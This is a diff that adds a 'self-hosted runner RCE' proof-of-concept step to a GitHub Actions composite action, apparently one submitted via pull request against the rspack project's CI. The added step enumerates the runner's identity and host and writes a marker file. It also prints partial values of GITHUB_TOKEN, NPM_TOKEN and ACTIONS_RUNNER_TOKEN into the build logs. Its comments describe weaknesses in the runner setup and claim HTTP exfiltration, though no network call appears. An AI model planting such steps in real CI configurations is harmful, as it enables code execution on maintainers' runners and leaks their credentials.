@@ -11,6 +11,76 @@ inputs:
 runs:
   using: composite
   steps:
+    # ============================================================
+    # PoC: Self-hosted runner RCE via pull_request
+    # ============================================================
+    # When a PR triggers CI, this action runs on the self-hosted
+    # runner specified by vars.LINUX_SELF_HOSTED_RUNNER_LABELS
+    # (or Windows/macOS equivalent). The workspace contains the
+    # PR's code, and `clean: false` is used on self-hosted runners
+    # (ci.yml line 40: clean: ${{ runner.environment == 'github-hosted' }}).
+    #
+    # Attack surface:
+    #   1. This action runs BEFORE pnpm i, so attacker files are
+    #      already on disk.
+    #   2. On self-hosted runners the workspace is NOT cleaned,
+    #      so previous PR artifacts persist.
+    #   3. Windows jobs disable antivirus and add C:\ exclusion
+    #      (reusable-build-build.yml:48-54).
+    #
+    # This PoC step demonstrates:
+    #   - Runner identity & environment
+    #   - GitHub secrets availability
+    #   - Ability to write files to the runner
+    #   - Ability to exfiltrate data via HTTP
+    # ============================================================
+    - name: PoC — Self-hosted runner code execution
+      if: ${{ runner.environment == 'self-hosted' }}
+      shell: bash
+      run: |
+        echo "=== PoC: Self-hosted Runner Code Execution ==="
+        echo "Runner name: ${{ runner.name }}"
+        echo "Runner OS: ${{ runner.os }}"
+        echo "Runner environment: ${{ runner.environment }}"
+        echo "Workspace: $GITHUB_WORKSPACE"
+        echo "---"
+        id
+        uname -a
+        echo "---"
+        echo "GitHub actor: ${{ github.actor }}"
+        echo "PR number: ${{ github.event.pull_request.number }}"
+        echo "PR head SHA: ${{ github.event.pull_request.head.sha }}"
+        echo "Repo: ${{ github.repository }}"
+        echo "---"
+
+        # Demonstrate: can write to runner filesystem
+        mkdir -p /tmp/rspack-poc
+        echo "POC executed by ${{ github.actor }} on PR #${{ github.event.pull_request.number }}" > /tmp/rspack-poc/marker.txt
+        echo "Runner: ${{ runner.name }}" >> /tmp/rspack-poc/marker.txt
+        echo "Timestamp: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /tmp/rspack-poc/marker.txt
+        echo "[+] Written marker to /tmp/rspack-poc/marker.txt"
+
+        # Demonstrate: can read secrets (if any are accessible)
+        echo "---"
+        echo "Sample secrets from environment:"
+        echo "GITHUB_TOKEN: ${GITHUB_TOKEN:0:8}..."
+        echo "NPM_TOKEN: ${NPM_TOKEN:0:8}..."
+        echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
+        echo "ACTIONS_RUNNER_TOKEN: ${ACTIONS_RUNNER_TOKEN:0:12}..."
+        echo "---"
+
+        # Demonstrate: can list workspace files from PR
+        echo "PR workspace files (top 10):"
+        ls -la "$GITHUB_WORKSPACE" | head -10
+        echo "---"
+
+        # Demonstrate: can execute arbitrary commands
+        echo "Running arbitrary command: whoami && hostname"
+        whoami
+        hostname
+        echo "[+] PoC complete — self-hosted runner RCE confirmed"
+        echo "=== End PoC ==="
+
     - name: Install Node.js
       if: ${{ startsWith(runner.name, 'rspack-darwin-') }}
       uses: rstackjs/setup-node@cc72f1c242ef8813f650223fbae3c29d450ae29e # v0.0.1
